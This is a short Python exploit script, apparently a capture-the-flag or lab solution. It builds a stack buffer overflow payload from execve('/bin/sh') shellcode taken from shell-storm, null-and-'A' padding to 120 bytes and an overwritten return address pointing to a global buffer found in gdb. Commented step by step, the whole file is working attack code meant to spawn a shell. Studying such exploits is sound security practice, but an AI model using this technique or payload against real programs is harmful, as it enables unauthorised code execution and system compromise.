#!/usr/bin/env python3

from sys import stdout
import pwn

# Shellcode from https://shell-storm.org/shellcode/files/shellcode-104.html
shellcode = b"\x48\x31\xc9\xeb\x10\x5e\x48\x89\xf7\x56\x51\x48\x89\xe6\x48\x89\xca\xb0\x3b\x0f\x05\x48\xe8\xea\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# After experimenting with inputs it has been found that after 120 characters we start to overwrite the rip saved in the stack
# Since the last thing in the shellcode is the string "/bin/sh", it must be terminated with '\0' before the rest padding
pad = b"\x00" + b"A" * (120 - len(shellcode) - 1) # subtract the previous number of characters (shellcode + '\0')

# The address of big_boy_buffer has been from gdb 0x404080 and this will be the value that we will overwrite the saved rip in the stack
rip = b"\x80\x40\x40\x00\x00\x00\x00\x00" # the bytes are writen in reverse order due to little-endian

# payload = shellcode + pad + rip + '\n'
payload = shellcode + pad + rip + b"\x0a"

# Write output
stdout.buffer.write(payload)
